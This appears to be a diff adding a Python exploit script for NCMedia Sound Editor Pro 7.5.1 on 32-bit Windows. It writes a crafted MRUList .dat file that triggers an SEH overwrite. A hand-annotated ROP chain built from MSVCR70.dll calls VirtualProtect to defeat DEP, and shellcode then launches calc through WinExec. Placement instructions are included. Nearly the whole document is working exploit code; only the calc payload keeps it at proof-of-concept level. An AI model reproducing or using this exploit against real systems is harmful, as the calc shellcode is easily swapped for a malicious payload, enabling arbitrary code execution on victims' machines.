@@ -1,0 +1,102 @@
+#!/usr/bin/python
+
+#---------------------------------------------------------------------------#
+# Exploit: NCMedia Sound Editor Pro v7.5.1 SEH&DEP                          #
+# Author: b33f - http://www.fuzzysecurity.com/                              #
+# OS: Windows 7 Pro SP1 (probably universal across 32-bit)                  #
+# POC - Julien Ahrens XP SP3: http://www.exploit-db.com/exploits/21331/     #
+# Software: http://www.soundeditorpro.com/                                  #
+# HOWTO: put the *.dat file in [USER]\Roaming\Sound Editor Pro\             #
+#        open -> click "File" menu -> calc ;))                              #
+#---------------------------------------------------------------------------#
+# Curiously enough, the only thing that went through the mind of the        #
+# ROP-Chain as it was executed was "Oh no, not again"!                      #
+#---------------------------------------------------------------------------#
+
+import sys, socket, struct 
+
+file="MRUList201202.dat"
+
+#--------------------------------------------------------------------------------------------------------------#
+# Semi-Universal ROP chain based entirely on MSVCR70.dll which comes packaged with "NCMedia Sound Editor"...   #
+#--------------------------------------------------------------------------------------------------------------#
+rop = struct.pack('<L',0x7c0126bc)  # XCHG EAX,EBP # ADD AL,7C # RETN                                           \
+rop += struct.pack('<L',0x7c0358a1) # POP EAX # RETN                                                             |
+rop += struct.pack('<L',0x7C0390FD) # VirtualProtect() -> ESI=0 EBP=0 -> 7c039138(VP)-3B                         | MOV VP -> ESI
+rop += struct.pack('<L',0x7c023a4f) # ADD ESI,DWORD PTR DS:[EAX+EBP+3B] # RETN                                  /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c0358a1) # POP EAX # RETN                                                            \
+rop += struct.pack('<L',0xFFBF90EF) # NEG is -> 0x00406f11 : jmp esp [SoundEditorPro.exe]                        | JMP ESP -> EBP
+rop += struct.pack('<L',0x7c0167cd) # NEG EAX # RETN [MSVCR70.dll]                                               |
+rop += struct.pack('<L',0x7c0126b7) # XCHG EAX,EBP # ADD AL,7C # RETN                                           /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c0358a1) # POP EAX # RETN                                                            \
+rop += struct.pack('<L',0xFFFFFDFF) # Neg is 201-HEX (513-bytes)                                                 | Executable Size -> EBX
+rop += struct.pack('<L',0x7c0167cd) # NEG EAX # RETN                                                             |
+rop += struct.pack('<L',0x7c01561c) # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN                                /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c026484) # POP EDI # RETN                                                            \  ROP-NOP -> EDI
+rop += struct.pack('<L',0x7c034e02) # ROP-NOP                                                                   /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c0358a1) # POP EAX # RETN                                                            \
+rop += struct.pack('<L',0xFFFFFFC0) # NEG is 0x40                                                                | newProtect -> EDX
+rop += struct.pack('<L',0x7c0167cd) # NEG EAX # RETN                                                             |
+rop += struct.pack('<L',0x7c026dc4) # MOV EDX,EAX # INC ECX # MOVZX EAX,BYTE PTR DS:[ECX] # ADD EAX,EDX # RETN  /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c034e01) # POP ECX # RETN                                                            \  RW lpOldProtect -> ECX
+rop += struct.pack('<L',0x7c049001) # lpOldProtect                                                              /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c0358a1) # POP EAX # RETN                                                            \  NOP padding -> EAX
+rop += struct.pack('<L',0x90909090) # NOP                                                                       /
+#--------------------------------------------------------------------------------------------------------------#
+rop += struct.pack('<L',0x7c0126b6) # PUSHAD # XCHG EAX,EBP # ADD AL,7C # RETN                                  |  PUSHAD -> pwnd!!
+#--------------------------------------------------------------------------------------------------------------#
+
+#----------------------------------
+# Greets to SkyLined, you do great work with shellcode!!
+#----------------------------------
+calc = (
+"\x31\xD2"                      #
+"\x52"                          #
+"\x68\x63\x61\x6C\x63"          # Stack has arguments for
+"\x89\xE6"                      # WinExec -> calc
+"\x52"                          #
+"\x56"                          ########
+"\x64\x8B\x72\x30"              #
+"\x8B\x76\x0C"                  #
+"\x8B\x76\x0C"                  # Found Kernel32
+"\xAD"                          # base address
+"\x8B\x30"                      #
+"\x8B\x7E\x18"                  ########
+"\x8B\x5F\x3C"                  # Found export table offset
+"\x8B\x5C\x1F\x78"              ########
+"\x8B\x74\x1F\x20"              # Found export names table
+"\x01\xFE"                      ########
+"\x8B\x4C\x1F\x24"              # Found export ordinals table
+"\x01\xF9"                      ########
+"\x42"                          #
+"\xAD"                          # Found WinExec ordinal
+"\x81\x3C\x07\x57\x69\x6E\x45"  #
+"\x75\xF5"                      ########
+"\x0F\xB7\x54\x51\xFE"          #
+"\x8B\x74\x1F\x1C"              #
+"\x01\xFE"                      # Pop calc ;))
+"\x03\x3C\x96"                  #
+"\xFF\xD7")                     #
+
+#----------------------------------
+# badchars -> '\x00\x0d\x0a'
+# 0x0040e02a {pivot 1092}  # ADD ESP,444 # RETN [SoundEditorPro.exe]
+# ROP-NOP Slide 0x7c034e02 [MSVCR70.dll]
+#----------------------------------
+b00m = "\x90"*10 + calc
+poc = "\x02\x4E\x03\x7C"*61 + rop + b00m + "\x41"*(3880-len(rop + b00m)) + "\x2A\xE0\x40\x00"
+
+try:
+    print "[*] Creating exploit file...\n"
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!"
+except:
+    print "[!] Error while creating file!"
